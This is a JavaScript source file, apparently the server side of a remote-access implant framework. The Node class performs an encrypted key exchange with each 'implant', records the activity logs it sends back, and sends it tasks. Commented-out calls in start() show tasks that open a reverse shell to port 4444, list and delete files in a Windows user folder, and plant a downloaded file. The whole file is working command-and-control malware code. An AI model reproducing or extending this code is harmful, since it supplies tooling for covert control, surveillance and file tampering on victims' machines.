const fs = require('fs');
const path = require('path');
const short = require('short-uuid');

const config = require('./config');
const Files = require('./files');
const { Task, Commands } = require('./task');
const { LOG, ACTIVITY, ERROR, TASK } = require('./logging');

const crypto = require("./crypto.js");

class Node {
    constructor(socket) {
        this.socket = socket;
        this.id = socket.id;
        this.ip = socket.conn.remoteAddress;
        this.aesKey = null;
        this.logStream = null;
        this.tasks = {}

        LOG(`Connection from ${this.ip}`);
        this.setupListeners();
        this.setupLogging();
        this.keyExchange();
    }

    setupListeners() {
        this.socket.on('disconnect', () => {
            LOG(`Connection from ${this.ip} disconnected`);
            // delete nodes[this.id];
        });

    }

    keyExchange() {
        this.socket.on('key', (implantPublicKey, sendPublicKey) => {
            this.aesKey = crypto.generateSecret(implantPublicKey);
            sendPublicKey(crypto.getPublicKey());
            this.socket.on('success', () => this.start());
        });
    }

    setupLogging() {
        const logFileName = `${this.ip.replace(/\.|:/g, '_')}.log`;
        this.logStream = fs.createWriteStream(path.join(`${__dirname}/logs`, logFileName), { flags: 'a' });

        this.socket.on('activity', (activity) => {
            const activityLogs = crypto.decrypt(Buffer.from(activity), this.aesKey)
            ACTIVITY(activityLogs.replace(/\n/g, ''));
            this.logStream.write(activityLogs);
        });
    }

    sendTask(task) {

        if (task.commandID == Commands.UPLOAD_FILE) {
            const fileID = short.generate();
            Files[fileID] = task.args.url
            const url = `http://${config.PUBLIC_IP}:${config.PORT}/download/${fileID}`
            task.args.url = url
        }

        LOG("Sending task")
        console.log(task)

        return new Promise((resolve, reject) => {
            this.socket.emit("command", crypto.encryptJSON(task, this.aesKey), (res) => {
                if (res) {
                    let decrypted = crypto.decryptJSON(res, this.aesKey);
                    this.handleResponse(task, decrypted);
                    if (decrypted.error) {
                        reject(decrypted.error)
                    } else {
                        resolve(decrypted.result);
                    }
                } else {
                    reject("No response")
                }
            })
        }).catch(err => ERROR(err));
    }

    handleResponse(task, response) {
        LOG(`Response received`);
        if (response) {
            this.tasks[task.taskID] = {
                ...task,
                command: Object.keys(Commands)[task.commandID],
                response: response
            }
            // console.dir(this.tasks[task.taskID], { depth: null })
        }
    }

    monitor() {
        this.socket.emit("monitor", true);
    }

    start() {
        LOG(`Key exchange successful`);
        LOG(`AES key: ${this.aesKey.toString('hex')}`);
        LOG(`Running commands`);

        // this.sendTask(Task(Commands.SHELL, {
        //     ip: '10.0.2.2',
        //     port: 4444
        // }));

        // let task = Task(Commands.LIST_FILES, {
        //     path: `C:\\Users\\User\\`
        // })

        // this.sendTask(task);

        // this.monitor();
        // this.sendTask(Task(Commands.SHELL, {
        //     port: 4444
        // }));

        // this.sendTask(Task(Commands.UPLOAD_FILE, {
        //     url: "https://picsum.photos/1200",
        //     path: "C:\\Users\\User\\example.png"
        // }));

        // this.sendTask(Task(Commands.DELETE_FILE, {
        //     path: "C:\\Users\\User\\hello.txt"
        // }));

        // this.monitor();
    }
}

module.exports = Node;